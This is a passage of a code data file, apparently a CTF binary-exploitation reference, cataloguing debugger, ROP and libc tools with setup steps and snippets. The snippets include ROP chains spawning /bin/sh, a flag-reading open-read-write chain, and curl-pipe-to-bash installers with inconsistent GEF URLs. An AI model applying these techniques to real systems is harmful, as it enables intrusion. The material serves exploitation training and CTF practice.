      detectionSteps: ['Use `vmmap` in GDB to see heap segment'],
    },
    exploitationPaths: [
      {
        name: 'Analyzing Heap State',
        description: 'Using GDB to inspect heap structures.',
        steps: [
          'Run binary and allocate some chunks',
          'Break in GDB and use `heap` or `vis_heap_chunks` in pwndbg/gef',
          'Inspect the free bins using `bins` or `tcachebins` command',
        ],
        tools: ['GDB (pwndbg/gef)'],
      }
    ],
    postconditions: {
      successIndicators: ['Understanding of current heap layout and free lists.'],
      artifacts: ['Heap layout analysis'],
    },
    operatorChecklist: [
      '[ ] Identify glibc version: ldd ./binary; strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C"',
      '[ ] Check if tcache is enabled (glibc >= 2.26)',
      '[ ] Check for Safe-Linking (glibc >= 2.32): fd pointers are XORed',
      '[ ] Examine bin layout in GDB: pwndbg bins',
      '[ ] Identify chunk size classes for fastbin/tcache/smallbin/largebin',
      '[ ] Locate the tcache_perthread_struct and heap base address',
    ],
    vulnerabilityTypes: ['Heap'],
    references: []
  },


  // ============== ENVIRONMENT SETUP ==============

  // ============== TOOLS ==============

  pwndbg: {
    id: 'pwndbg',
    name: 'pwndbg',
    category: 'leaf',
    class: 'Tool',
    description: 'GDB plug-in that makes debugging with GDB suck less.',
    preconditions: {
      summary: 'GDB installed.',
      required: ['GDB', 'Python3'],
      detectionSteps: [],
    },
    exploitationPaths: [
      {
        name: 'Using pwndbg',
        description: 'Common commands for exploit dev.',
        steps: [
          'Run `gdb ./binary`',
          'Use `vmmap` to check memory segments',
          'Use `checksec` to see protections',
          'Use `telescope` or `x/gx` to view stack/memory',
        ],
        tools: ['GDB'],
      }
    ],
    postconditions: {
      successIndicators: ['Successfully debugged binary.'],
      artifacts: [],
    },
    operatorChecklist: [
      '[ ] Clone pwndbg repo: git clone https://github.com/pwndbg/pwndbg',
      '[ ] Run setup: cd pwndbg && ./setup.sh',
      '[ ] Verify pwndbg loads: gdb ./binary → check for pwndbg prompt',
      '[ ] Test key commands: vmmap, heap, bins, checksec, canary, telescope',
      '[ ] Set disassembly flavor: set disassembly-flavor intel',
      '[ ] Configure context layout for exploit development workflow',
    ],
    vulnerabilityTypes: ['General'],
    references: []
  },

  gef: {
    id: 'gef',
    name: 'GEF',
    category: 'leaf',
    class: 'Tool',
    description: 'GDB Enhanced Features for exploit devs & reversers.',
    preconditions: {
      summary: 'GDB installed.',
      required: ['GDB', 'Python3'],
      detectionSteps: [],
    },
    exploitationPaths: [
      {
        name: 'Using GEF',
        description: 'Common commands for exploit dev.',
        steps: [
          'Run `gdb ./binary`',
          'Use `pattern create` and `pattern search` for offsets',
          'Use `checksec` to see protections',
          'Use `heap chunks` to inspect heap',
        ],
        tools: ['GDB'],
      }
    ],
    postconditions: {
      successIndicators: ['Successfully debugged binary.'],
      artifacts: [],
    },
    operatorChecklist: [
      '[ ] Install GEF: bash -c "$(curl -fsSL https://gef.blah.cat/sh)"',
      '[ ] Verify GEF loads: gdb ./binary → check for GEF prompt',
      '[ ] Test pattern create/search: pattern create 200 → pattern search $rsp',
      '[ ] Test heap analysis: heap chunks, heap bins',
      '[ ] Test checksec: gef checksec',
      '[ ] Set assembly syntax: set disassembly-flavor intel',
    ],
    vulnerabilityTypes: ['General'],
    references: []
  },

  pwntools: {
    id: 'pwntools',
    name: 'pwntools',
    category: 'leaf',
    class: 'Tool',
    description: 'CTF framework and exploit development library for Python.',
    preconditions: {
      summary: 'Python3 installed.',
      required: ['Python3', 'pip'],
      detectionSteps: [],
    },
    exploitationPaths: [
      {
        name: 'Writing Exploit Script',
        description: 'Basic template for pwntools script.',
        steps: [
          'Import: `from pwn import *`',
          'Set context: `context.binary = elf = ELF("./binary")`',
          'Start process: `p = process()` or `p = remote("host", port)`',
          'Interact: `p.sendline(payload)`, `p.interactive()`',
        ],
        tools: ['Python'],
        codeSnippet: 'from pwn import *\nelf = context.binary = ELF("./binary")\np = process()\np.interactive()'
      }
    ],
    postconditions: {
      successIndicators: ['Exploit script executed successfully.'],
      artifacts: ['exploit.py'],
    },
    operatorChecklist: [
      '[ ] Install pwntools: pip install pwntools',
      '[ ] Import and configure: from pwn import *; context.arch = "amd64"',
      '[ ] Create connection: p = process("./binary") or p = remote("host", port)',
      '[ ] Use ELF class for analysis: elf = ELF("./binary"); elf.got, elf.symbols',
      '[ ] Build ROP chains: rop = ROP(libc); rop.call("system", ["/bin/sh"])',
      '[ ] Find offsets: cyclic(200) → cyclic_find(core.read(rsp, 4))',
      '[ ] Use shellcraft for shellcode: asm(shellcraft.sh())',
    ],
    vulnerabilityTypes: ['General'],
    references: []
  },

  ropper: {
    id: 'ropper',
    name: 'Ropper',
    category: 'leaf',
    class: 'Tool',
    description: 'Tool to search for gadgets to build ROP chains.',
    preconditions: {
      summary: 'Python3 installed.',
      required: ['Python3'],
      detectionSteps: [],
    },
    exploitationPaths: [
      {
        name: 'Finding Gadgets',
        description: 'Searching for specific instructions.',
        steps: [
          'Run `ropper --file ./binary --search "pop rdi"`',
          'Extract the address of the desired gadget',
        ],
        tools: ['CLI'],
      }
    ],
    postconditions: {
      successIndicators: ['Found required ROP gadgets.'],
      artifacts: ['Gadget addresses'],
    },
    operatorChecklist: [
      '[ ] Install ropper: pip install ropper',
      '[ ] Search for gadgets: ropper --file ./binary --search "pop rdi"',
      '[ ] Find syscall gadgets: ropper --file ./binary --search "syscall"',
      '[ ] Build ROP chains: ropper --file ./binary --chain execve',
      '[ ] Search for specific instruction patterns: ropper --file ./binary --search "leave; ret"',
      '[ ] Compare with ROPgadget output for completeness',
    ],
    vulnerabilityTypes: ['General'],
    references: []
  },

  one_gadget: {
    id: 'one_gadget',
    name: 'one_gadget',
    category: 'leaf',
    class: 'Tool',
    description: 'Tool to find the execve("/bin/sh", NULL, NULL) call in libc.',
    preconditions: {
      summary: 'Ruby installed.',
      required: ['Ruby', 'gem'],
      detectionSteps: [],
    },
    exploitationPaths: [
      {
        name: 'Finding One Gadgets',
        description: 'Extracting one_gadget offsets from libc.',
        steps: [
          'Run `one_gadget /path/to/libc.so.6`',
          'Check the constraints for each gadget (e.g., `rcx == NULL`)',
          'Add the offset to the libc base address in exploit script',
        ],
        tools: ['CLI'],
      }
    ],
    postconditions: {
      successIndicators: ['Found one_gadget offsets and constraints.'],
      artifacts: ['One gadget offsets'],
    },
    operatorChecklist: [
      '[ ] Install one_gadget: gem install one_gadget',
      '[ ] Run on target libc: one_gadget /lib/x86_64-linux-gnu/libc.so.6',
      '[ ] Note each gadget address and its constraints',
      '[ ] Verify constraints are satisfied at the call site in your exploit',
      '[ ] Test each gadget locally: if constraints don\'t match, try the next one',
      '[ ] Use with pwntools: one_gadget offsets integrated via libc.one_gadget()',
    ],
    vulnerabilityTypes: ['General'],
    references: []
  },

  setup_gdb: {
    id: 'setup_gdb',
    name: 'GDB + pwndbg Setup',
    category: 'setup',
    class: 'tool-setup',
    description: 'Install and configure GDB with pwndbg for binary exploitation debugging. pwndbg adds heap inspection, register context, and exploit development helpers that make GDB usable for pwn.',

    preconditions: {
      summary: 'A Linux environment (Ubuntu 20.04/22.04 or WSL2) with development tools installed. GDB and pwndbg are the single most important tools for exploit development.',
      required: [
        'Ubuntu/Debian-based Linux or WSL2',
        'Python 3.8+ with pip',
        'Git for cloning pwndbg',
        'Internet connection for downloading dependencies'
      ],
      detectionSteps: [
        'Run: gdb --version (should show GDB 10+)',
        'Run: python3 --version (should show Python 3.8+)',
        'After pwndbg install: gdb -ex "pwndbg" ./binary',
        'Verify pwndbg context display appears in GDB'
      ]
    },

    exploitationPaths: [
      {
        name: 'Full Setup: GDB + pwndbg',
        description: 'Install GDB with pwndbg enhancement and verify it works with a test binary.',
        steps: [
          'sudo apt update && sudo apt install -y gdb gdb-multiarch python3-dev git',
          'cd ~ && git clone https://github.com/pwndbg/pwndbg',
          'cd pwndbg && ./setup.sh',
          'Add to ~/.gdbinit: set disassembly-flavor intel (optional)',
          'Test: gdb ./your_binary → should show pwndbg prompt with context',
          'Essential pwndbg commands: checksec, vmmap, heap, telescope, search, got, context'
        ],
        tools: ['gdb', 'pwndbg', 'gdb-multiarch'],
        codeSnippet: `# Install GDB + pwndbg
sudo apt update && sudo apt install -y gdb gdb-multiarch python3-dev git
cd ~
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Essential pwndbg commands during exploitation:
# pwndbg> checksec          → show binary protections
# pwndbg> vmmap             → show memory regions and permissions
# pwndbg> heap chunks       → show heap chunk layout
# pwndbg> heap bins          → show tcache/fastbin/unsorted bins
# pwndbg> telescope $rsp 20  → dump 20 qwords from stack
# pwndbg> got                → show GOT entries
# pwndbg> search -t string "flag" → search memory for strings`,
        applicableLibc: 'All versions',
        references: [
          { description: 'pwndbg GitHub', url: 'https://github.com/pwndbg/pwndbg' },
          { description: 'pwndbg Commands Reference', url: 'https://pwndbg.re/en/latest/commands/' }
        ]
      },
      {
        name: 'GEF Alternative Setup',
        description: 'Install GEF (GDB Enhanced Features) as an alternative to pwndbg.',
        steps: [
          'Run: bash -c "$(curl -fsSL https://gef.blahcat.sh)"',
          'Or: wget -q -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/main/gef.py',
          'Add to ~/.gdbinit: source ~/.gdbinit-gef.py',
          'Test: gdb ./binary → should show GEF context'
        ],
        tools: ['gdb', 'GEF'],
        codeSnippet: `# Install GEF
bash -c "$(curl -fsSL https://gef.blahcat.sh)"

# Key GEF commands:
# gef> heap chunks          → show heap layout
# gef> checksec             → show protections
# gef> pattern create 200   → generate cyclic pattern
# gef> pattern search $rsp  → find offset
# gef> vmmap               → memory map`,
        applicableLibc: 'All versions',
        references: [
          { description: 'GEF GitHub', url: 'https://github.com/hugsy/gef' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['GDB launches with pwndbg/GEF context display', 'checksec command works inside GDB', 'heap commands available'],
      artifacts: ['~/.gdbinit configured', 'pwndbg installed in ~/pwndbg']
    },

    operatorChecklist: [
      '[ ] apt install gdb gdb-multiarch python3-dev git',
      '[ ] git clone pwndbg && cd pwndbg && ./setup.sh',
      '[ ] Verify: gdb ./binary shows pwndbg context',
      '[ ] Test: checksec, vmmap, heap commands work',
      '[ ] Set disassembly-flavor intel in ~/.gdbinit'
    ],

    vulnerabilityTypes: ['tool-setup', 'debugging'],
    references: [
      { description: 'pwndbg GitHub', url: 'https://github.com/pwndbg/pwndbg' },
      { description: 'GEF - GDB Enhanced Features', url: 'https://github.com/hugsy/gef' },
      { description: 'PEDA - Python Exploit Dev Assistance', url: 'https://github.com/longld/peda' }
    ]
  },

  setup_pwntools: {
    id: 'setup_pwntools',
    name: 'pwntools Setup',
    category: 'setup',
    class: 'tool-setup',
    description: 'Install pwntools — the Python exploit development framework. Provides process/remote tube abstraction, ROP chain building, cyclic patterns, ELF parsing, and shellcraft.',

    preconditions: {
      summary: 'Python 3.8+ environment with pip. pwntools is the standard exploit development library used in virtually every CTF writeup.',
      required: [
        'Python 3.8+ with pip3',
        'Linux system (WSL2 on Windows)',
        'Internet connection for pip install'
      ],
      detectionSteps: [
        'Run: python3 -c "from pwn import *; print(\'pwntools OK\')"',
        'Run: pwn --version',
        'Verify cyclic, ROPgadget, checksec commands are available',
        'Test with a simple script: p = process("/bin/ls")'
      ]
    },

    exploitationPaths: [
      {
        name: 'Full pwntools Installation',
        description: 'Install pwntools with all dependencies and cross-architecture support.',
        steps: [
          'pip3 install pwntools',
          'sudo apt install -y binutils-arm-linux-gnueabihf binutils-mips-linux-gnu binutils-aarch64-linux-gnu',
          'Add to ~/.bashrc: export PWNTOOLS_SILENT=1 (optional, suppresses warnings)',
          'Test: python3 -c "from pwn import *; print(context.arch)"',
          'Optional: install pwntools docs locally with pip3 install pwntools-docs'
        ],
        tools: ['pwntools', 'pip3'],
        codeSnippet: `# Install pwntools
pip3 install pwntools

# Cross-architecture binutils (for shellcraft/ASM)
sudo apt install -y binutils-arm-linux-gnueabihf \\
  binutils-mips-linux-gnu binutils-aarch64-linux-gnu

# Essential pwntools patterns
from pwn import *

# Context setup
context.update(arch='amd64', os='linux', log_level='debug')

# Local process
p = process('./binary')
# Remote connection
p = remote('host.ctf.com', 1337)

# Cyclic pattern for offset discovery
payload = cyclic(200)
p.sendline(payload)
# After crash: cyclic_find(core.read(core.rsp, 4))

# ELF parsing
e = ELF('./binary')
print(f"PIE: {e.pie}, NX: {e.execstack}")
print(f"system @ {hex(e.symbols['system'])}")

# ROP chain building
rop = ROP(e)
rop.call('system', [next(e.search(b'/bin/sh'))])
print(rop.dump())`,
        applicableLibc: 'All versions',
        references: [
          { description: 'pwntools Docs', url: 'https://docs.pwntools.com/' },
          { description: 'pwntools GitHub', url: 'https://github.com/Gallopsled/pwntools' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['python3 -c "from pwn import *" works', 'pwn checksec ./binary works', 'cyclic pattern generation works'],
      artifacts: ['pwntools installed in pip3', 'pwn command available in PATH']
    },

    operatorChecklist: [
      '[ ] pip3 install pwntools',
      '[ ] Install cross-architecture binutils',
      '[ ] Verify: python3 -c "from pwn import *; print(\'OK\')"',
      '[ ] Test: pwn checksec /bin/ls',
      '[ ] Test: cyclic(100) generates pattern',
      '[ ] Add export PWNTOOLS_SILENT=1 to ~/.bashrc (optional)'
    ],

    vulnerabilityTypes: ['tool-setup', 'exploitation'],
    references: [
      { description: 'pwntools Documentation', url: 'https://docs.pwntools.com/' },
      { description: 'pwntools GitHub', url: 'https://github.com/Gallopsled/pwntools' }
    ]
  },

  setup_ghidra: {
    id: 'setup_ghidra',
    name: 'Ghidra Setup',
    category: 'setup',
    class: 'tool-setup',
    description: 'Install Ghidra — the free NSA reverse engineering suite with decompiler, disassembler, and scriptable analysis. Essential for understanding binary logic.',

    preconditions: {
      summary: 'Java JDK 17+ and 4GB+ RAM for large binaries. Ghidra is the go-to free alternative to IDA Pro.',
      required: [
        'Java JDK 17+ (sudo apt install default-jdk)',
        '4GB+ RAM (8GB+ recommended for large binaries)',
        'X11 display (or X11 forwarding from remote)',
        'Disk space: ~1GB for Ghidra itself'
      ],
      detectionSteps: [
        'Run: java -version (should show 17+)',
        'Run: ./ghidraRun (launches Ghidra GUI)',
        'Create new project, import a binary, verify auto-analysis runs',
        'Check that decompiler window opens and produces C-like output'
      ]
    },

    exploitationPaths: [
      {
        name: 'Full Ghidra Installation',
        description: 'Download and install Ghidra with Java JDK.',
        steps: [
          'sudo apt install default-jdk',
          'Download latest Ghidra from https://ghidra-sre.org/',
          'Unzip: unzip ghidra_*.zip',
          'Run: ./ghidraRun',
          'Create project → Import binary → Auto-Analyze (select all options)',
          'After analysis: Window → Defined Strings, Function Call Graph'
        ],
        tools: ['ghidra', 'java'],
        codeSnippet: `# Install Ghidra
sudo apt install default-jdk
cd ~
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra11.2.1_build/ghidra_11.2.1_PUBLIC.zip
unzip ghidra_11.2.1_PUBLIC.zip
cd ghidra_11.2.1_PUBLIC
./ghidraRun

# Headless analysis (for scripting):
analyzeHeadless /tmp/project Binary \\
  -import ./challenge -postScript Analyze.java

# Key Ghidra shortcuts:
# L → Rename variable/function
# T → Retype variable
# ; → Add comment
# G → Go to address
# Search → For Strings... → find /bin/sh, flag paths
# Window → Function Call Graph → visualize calls`,
        applicableLibc: 'N/A (static analysis tool)',
        references: [
          { description: 'Ghidra Downloads', url: 'https://ghidra-sre.org/' },
          { description: 'Ghidra GitHub', url: 'https://github.com/NationalSecurityAgency/ghidra' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Ghidra GUI launches', 'Binary imports and auto-analyzes', 'Decompiler produces C-like output'],
      artifacts: ['~/ghidra_11.2.1_PUBLIC/ installed']
    },

    operatorChecklist: [
      '[ ] Install Java JDK 17+',
      '[ ] Download and unzip Ghidra',
      '[ ] Launch ./ghidraRun',
      '[ ] Import test binary and verify auto-analysis',
      '[ ] Verify decompiler window works'
    ],

    vulnerabilityTypes: ['tool-setup', 'reverse-engineering'],
    references: [
      { description: 'Ghidra Official', url: 'https://ghidra-sre.org/' },
      { description: 'Ghidra GitHub', url: 'https://github.com/NationalSecurityAgency/ghidra' }
    ]
  },

  setup_ida: {
    id: 'setup_ida',
    name: 'IDA Pro Setup',
    category: 'setup',
    class: 'tool-setup',
    description: 'Install IDA Pro — the industry-standard disassembler and decompiler (Hex-Rays). Best-in-class decompilation and plugin ecosystem. IDA Free available for x86.',

    preconditions: {
      summary: 'IDA Pro license (paid) for full features, or IDA Free for x86/x64 only. Required for serious binary analysis.',
      required: [
        'IDA Pro license (from hex-rays.com) or IDA Free',
        'Windows, Linux, or macOS',
        'Python 3 for IDAPython scripting'
      ],
      detectionSteps: [
        'Run: ida64 ./binary (launches IDA with binary)',
        'Press F5 to decompile (Hex-Rays)',
        'Verify decompiler output appears',
        'Install key plugins: LazyIDA, Keypatch, FindCrypt'
      ]
    },

    exploitationPaths: [
      {
        name: 'IDA Pro Installation and Plugin Setup',
        description: 'Install IDA Pro and essential plugins for exploit development.',
        steps: [
          'Download IDA from https://hex-rays.com/ida-pro/ (licensed) or IDA Free',
          'Install and activate license',
          'Install Hex-Rays decompiler for your architecture (x86/x64/ARM)',
          'Install plugins: LazyIDA, Keypatch, FindCrypt, d810 (decompiler optimizations)',
          'Configure IDAPython: Edit → Plugins → Python command',
          'Key exploit workflow: Search → Strings → find /bin/sh, system, flag'
        ],
        tools: ['ida', 'hex-rays', 'idapython'],
        codeSnippet: `# IDAPython Essential Scripts for PWN
import idautils, idc, idaapi

# Find all calls to dangerous functions
dangerous = ['gets', 'strcpy', 'sprintf', 'read', 'scanf']
for func_ea in idautils.Functions():
    name = idc.get_func_name(func_ea)
    if name in dangerous:
        for xref in idautils.XrefsTo(func_ea):
            print(f"  [!] {name} called at 0x{xref.frm:X}")

# Find /bin/sh string
for s in idautils.Strings():
    if '/bin/sh' in str(s):
        print(f"  /bin/sh @ 0x{s.ea:X}")

# List all functions with addresses
for func_ea in idautils.Functions():
    print(f"  {idc.get_func_name(func_ea)} @ 0x{func_ea:X}")`,
        applicableLibc: 'N/A (static analysis tool)',
        references: [
          { description: 'IDA Pro Homepage', url: 'https://hex-rays.com/ida-pro/' },
          { description: 'IDA Free Download', url: 'https://hex-rays.com/ida-free/' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['IDA launches and loads binary', 'Hex-Rays decompiler produces output (licensed)', 'IDAPython scripts execute'],
      artifacts: ['IDA Pro/Free installed', 'Plugins configured']
    },

    operatorChecklist: [
      '[ ] Install IDA Pro or IDA Free',
      '[ ] Install Hex-Rays decompiler (if licensed)',
      '[ ] Install LazyIDA, Keypatch plugins',
      '[ ] Load test binary and verify decompilation',
      '[ ] Test IDAPython scripting'
    ],

    vulnerabilityTypes: ['tool-setup', 'reverse-engineering'],
    references: [
      { description: 'IDA Pro', url: 'https://hex-rays.com/ida-pro/' },
      { description: 'IDA Free', url: 'https://hex-rays.com/ida-free/' }
    ]
  },

  setup_checksec: {
    id: 'setup_checksec',
    name: 'checksec Setup',
    category: 'setup',
    class: 'tool-setup',
    description: 'Install checksec — the binary protection analyzer. Always run FIRST on any target to determine NX, PIE, Canary, RELRO, and ASLR status.',

    preconditions: {
      summary: 'checksec is a standalone tool that reports binary security mitigations. It should be the very first tool you run on any target.',
      required: [
        'Linux system',
        'readelf, objdump (part of binutils)',
        'Python 3 (for pwntools checksec)'
      ],
      detectionSteps: [
        'Run: checksec --file=/bin/ls',
        'Or: pwn checksec /bin/ls',
        'Verify output shows: NX, PIE, Canary, RELRO status'
      ]
    },

    exploitationPaths: [
      {
        name: 'checksec Installation and Usage',
        description: 'Install checksec and interpret the output to determine exploit strategy.',
        steps: [
          'sudo apt install checksec (standalone version)',
          'OR: pip3 install pwntools (includes pwn checksec)',
          'Run: checksec --file=./target_binary',
          'Interpret each protection to plan bypass strategy'
        ],
        tools: ['checksec', 'pwn checksec'],
        codeSnippet: `# Install
sudo apt install checksec
# OR use pwntools version (more detailed):
pip3 install pwntools && pwn checksec ./binary

# Output interpretation:
# NX    = No-Execute: stack not executable → need ROP
# PIE   = Position Independent: base addr random → need leak
# Canary= Stack canary: overflow detection → need canary leak
# RELRO = Relocation Read-Only:
#   Partial → GOT writable → GOT overwrite possible
#   Full   → GOT read-only → need hook/FSOP instead
# ASLR  = Address Space Layout Randomization:
#   On → need leak for addresses
#   Off→ hardcoded addresses work

# pwntools programmatic:
from pwn import *
e = ELF('./binary')
print(f"NX: {not e.execstack}")
print(f"PIE: {e.pie}")
print(f"Canary: {e.canary}")
print(f"RELRO: {e.relro}")`,
        applicableLibc: 'All versions',
        references: [
          { description: 'checksec.sh GitHub', url: 'https://github.com/slimm609/checksec.sh' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['checksec --file output shows protection flags', 'pwn checksec works'],
      artifacts: ['checksec installed']
    },

    operatorChecklist: [
      '[ ] Install checksec (apt or pip3)',
      '[ ] Run on target binary',
      '[ ] Record NX, PIE, Canary, RELRO status',
      '[ ] Plan exploit path based on protections'
    ],

    vulnerabilityTypes: ['tool-setup', 'recon'],
    references: [
      { description: 'checksec.sh', url: 'https://github.com/slimm609/checksec.sh' }
    ]
  },

  setup_ropper: {
    id: 'setup_ropper',
    name: 'ROPgadget + ropper Setup',
    category: 'setup',
    class: 'tool-setup',
    description: 'Install ROP gadget search tools and one_gadget for libc RCE. Essential for building ROP chains and finding one-shot gadgets.',

    preconditions: {
      summary: 'ROPgadget (comes with pwntools) and ropper are used to find ROP gadgets. one_gadget finds single-gadget RCE offsets in libc.',
      required: [
        'Python 3 with pip',
        'capstone library (for ropper)',
        'Ruby (for one_gadget)'
      ],
      detectionSteps: [
        'Run: ROPgadget --binary /bin/ls | head -5',
        'Run: ropper --file /bin/ls --search "pop rdi"',
        'Run: one_gadget /lib/x86_64-linux-gnu/libc.so.6'
      ]
    },

    exploitationPaths: [
      {
        name: 'ROP Tool Installation',
        description: 'Install all ROP chain building tools.',
        steps: [
          'pip3 install ropper capstone',
          'sudo apt install ruby && gem install one_gadget',
          'ROPgadget comes with pwntools (already installed)',
          'Verify: ROPgadget --binary ./binary --ropchain'
        ],
        tools: ['ROPgadget', 'ropper', 'one_gadget'],
        codeSnippet: `# Install ROP tools
pip3 install ropper capstone
sudo apt install ruby && gem install one_gadget

# ROPgadget - find gadgets
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --ropchain    # auto chain

# ropper - cleaner output
ropper --file ./binary --search "pop rdi; ret"
ropper --file ./binary --chain "execve"   # auto chain

# one_gadget - find RCE in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# Output: constraints + addresses for one-shot execve

# pwntools ROP (recommended for complex chains)
from pwn import *
rop = ROP(ELF('./binary'))
rop.call('puts', [e.got['puts']])
rop.call('main')
rop.call('system', [next(e.search(b'/bin/sh'))])
print(rop.dump())`,
        applicableLibc: 'All versions',
        references: [
          { description: 'ROPgadget GitHub', url: 'https://github.com/JonathanSalwan/ROPgadget' },
          { description: 'one_gadget GitHub', url: 'https://github.com/david942j/one_gadget' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['ROPgadget finds gadgets in test binary', 'ropper search returns results', 'one_gadget finds gadgets in libc'],
      artifacts: ['ropper installed', 'one_gadget installed']
    },

    operatorChecklist: [
      '[ ] pip3 install ropper capstone',
      '[ ] gem install one_gadget',
      '[ ] Verify: ROPgadget --binary /bin/ls',
      '[ ] Verify: one_gadget /lib/x86_64-linux-gnu/libc.so.6'
    ],

    vulnerabilityTypes: ['tool-setup', 'rop'],
    references: [
      { description: 'ROPgadget', url: 'https://github.com/JonathanSalwan/ROPgadget' },
      { description: 'one_gadget', url: 'https://github.com/david942j/one_gadget' }
    ]
  },

  setup_libc_db: {
    id: 'setup_libc_db',
    name: 'libc-database Setup',
    category: 'setup',
    class: 'tool-setup',
    description: 'Install libc-database for offline libc fingerprinting. Identify exact libc versions from leaked function offsets — critical for remote exploitation.',

    preconditions: {
      summary: 'The libc-database lets you identify the exact libc version running on a target from as few as 2 leaked function addresses. Essential for remote pwn.',
      required: [
        'Git for cloning',
        '~2GB disk space for full database',
        'Internet for initial download',
        'At least 2 leaked libc function offsets'
      ],
      detectionSteps: [
        'cd ~ && git clone https://github.com/niklasb/libc-database',
        'cd libc-database && ./get ubuntu',
        'Test: ./identify printf <offset>',
        'Alternative: https://libc.rip (online)'
      ]
    },

    exploitationPaths: [
      {
        name: 'libc-database Installation and Usage',
        description: 'Set up libc database and learn to identify remote libc versions.',
        steps: [
          'git clone https://github.com/niklasb/libc-database',
          'cd libc-database',
          './get ubuntu (download Ubuntu libc versions)',
          './identify <function> <offset> (identify from leak)',
          './dump <libc_id> system "/bin/sh" (get offsets)',
          'Alternative online: https://libc.rip'
        ],
        tools: ['libc-database', 'libc.rip'],
        codeSnippet: `# Install libc-database
cd ~
git clone https://github.com/niklasb/libc-database
cd libc-database

# Download libc versions (takes time)
./get ubuntu     # Ubuntu libc versions
./get debian     # Debian libc versions

# Identify libc from leaked offsets
# If you leaked printf@0x7f1234567890 and puts@0x7f1234560000
./identify printf 0x7f1234567890
# OR provide multiple offsets for better accuracy

# Get symbol offsets from identified libc
./dump libc6_2.31-0ubuntu9_amd64 system "/bin/sh"
# Output: system offset, /bin/sh offset, one_gadget offsets

# Online alternative: https://libc.rip
# Enter leaked offsets → get matching libc download link

# pwntools integration
from pwn import *
libc = ELF('./identified_libc.so.6')
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]  # from one_gadget tool`,
        applicableLibc: 'All versions',
        references: [
          { description: 'libc-database GitHub', url: 'https://github.com/niklasb/libc-database' },
          { description: 'libc.rip Online', url: 'https://libc.rip' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['./identify returns libc version', './dump provides symbol offsets', 'libc.rip accessible'],
      artifacts: ['~/libc-database/ populated']
    },

    operatorChecklist: [
      '[ ] git clone libc-database',
      '[ ] Run ./get ubuntu to download libc versions',
      '[ ] Test: ./identify with known offset',
      '[ ] Bookmark https://libc.rip as online alternative'
    ],

    vulnerabilityTypes: ['tool-setup', 'libc-identification'],
    references: [
      { description: 'libc-database', url: 'https://github.com/niklasb/libc-database' },
      { description: 'libc.rip', url: 'https://libc.rip' }
    ]
  },

  setup_seccomp_tools: {
    id: 'setup_seccomp_tools',
    name: 'seccomp-tools Setup',
    category: 'setup',
    class: 'tool-setup',
    description: 'Install seccomp-tools to dump and analyze seccomp-BPF filter rules. Determines which syscalls are allowed, critical for choosing between execve vs ORW (open-read-write) chains.',

    preconditions: {
      summary: 'seccomp-tools reveals syscall filtering rules. If a binary has seccomp, you MUST check it before attempting execve shell.',
      required: [
        'Ruby (apt install ruby)',
        'Target binary to analyze'
      ],
      detectionSteps: [
        'gem install seccomp-tools',
        'seccomp-tools dump ./binary',
        'Interpret: if execve is KILL → use ORW chain'
      ]
    },

    exploitationPaths: [
      {
        name: 'seccomp-tools Installation and Usage',
        description: 'Install seccomp-tools and analyze syscall filters.',
        steps: [
          'sudo apt install ruby',
          'gem install seccomp-tools',
          'Run: seccomp-tools dump ./binary',
          'Check: is execve allowed or blocked?',
          'If blocked: plan open-read-write (ORW) chain instead'
        ],
        tools: ['seccomp-tools', 'ruby'],
        codeSnippet: `# Install
sudo apt install ruby
gem install seccomp-tools

# Dump seccomp rules
seccomp-tools dump ./binary
# Or with input:
echo "AAAA" | seccomp-tools dump ./binary

# Interpret output:
# ALLOW open, read, write, exit → can read flag via ORW
# KILL  execve              → MUST use ORW, no shell

# Build ORW chain if execve is blocked
from pwn import *
rop = ROP(elf)
rop.call('open', ['./flag', 0])     # fd = open("./flag", O_RDONLY)
rop.call('read', [3, buf, 100])      # read(fd, buf, 100)
rop.call('write', [1, buf, 100])     # write(stdout, buf, 100)

# Alternative: openat syscall (if open is blocked)
rop.call('openat', [0, './flag', 0])`,
        applicableLibc: 'N/A (kernel feature)',
        references: [
          { description: 'seccomp-tools GitHub', url: 'https://github.com/david942j/seccomp-tools' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['seccomp-tools dump shows syscall rules', 'Can determine if execve is allowed/blocked'],
      artifacts: ['seccomp-tools gem installed']
    },

    operatorChecklist: [
      '[ ] gem install seccomp-tools',
      '[ ] Run seccomp-tools dump on target',
      '[ ] Check if execve is allowed',
      '[ ] If blocked: plan ORW (open-read-write) chain'
    ],

    vulnerabilityTypes: ['tool-setup', 'sandbox-analysis'],
    references: [
      { description: 'seccomp-tools', url: 'https://github.com/david942j/seccomp-tools' }
    ]
  },

  setup_patchelf: {
    id: 'setup_patchelf',
    name: 'patchelf + pwninit Setup',
    category: 'setup',
    class: 'tool-setup',
    description: 'Install patchelf and pwninit to set up the correct libc environment locally. Essential for testing exploits against the same libc as the remote target.',

    preconditions: {
      summary: 'CTF challenges often use a different libc than your local system. patchelf and pwninit let you run the binary with the target libc.',
      required: [
        'Target libc.so.6 and ld-linux-x86-64.so.2 from remote',
        'patchelf (apt install patchelf)',
        'pwninit (pip install pwninit)'
      ],
      detectionSteps: [
        'Download libc.so.6 and ld-linux from CTF challenge',
        'Run: pwninit --binary ./challenge',
        'Verify: ldd ./challenge_patched shows correct libc'
      ]
    },

    exploitationPaths: [
      {
        name: 'patchelf + pwninit Setup',
        description: 'Configure binary to use target libc for local testing.',
        steps: [
          'sudo apt install patchelf',
          'pip3 install pwninit',
          'Place binary, libc.so.6, ld-linux in same directory',
          'Run: pwninit (auto-detects and patches)',
          'Verify: ./challenge_patched runs with correct libc',
          'Or manual: patchelf --set-interpreter ./ld-linux ./binary'
        ],
        tools: ['patchelf', 'pwninit', 'ldd'],
        codeSnippet: `# Install
